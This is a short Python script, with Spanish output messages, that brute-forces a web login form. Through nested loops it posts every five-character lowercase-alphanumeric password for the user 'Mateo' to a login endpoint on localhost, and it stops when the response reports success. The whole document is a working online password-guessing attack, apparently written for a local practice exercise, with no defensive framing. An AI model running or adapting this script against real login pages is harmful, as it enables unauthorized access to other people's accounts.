import requests

url = "http://127.0.0.1:8000/login"
username = "Mateo"

chars = "abcdefghijklmnopqrstuvwxyz0123456789"

encontrado = False

for c1 in chars:
    for c2 in chars:
        for c3 in chars:
            for c4 in chars:
                for c5 in chars:

                    password = c1 + c2 + c3 + c4 + c5
                    print("Probando:", password)

                    r = requests.post(
                        url,
                        data={
                            "username": username,
                            "password": password
                        }
                    )

                    if "Login exitoso" in r.text:
                        print("\n CONTRASEÑA ENCONTRADA:", password)
                        encontrado = True
                        break

                if encontrado: break
            if encontrado: break
        if encontrado: break
    if encontrado: break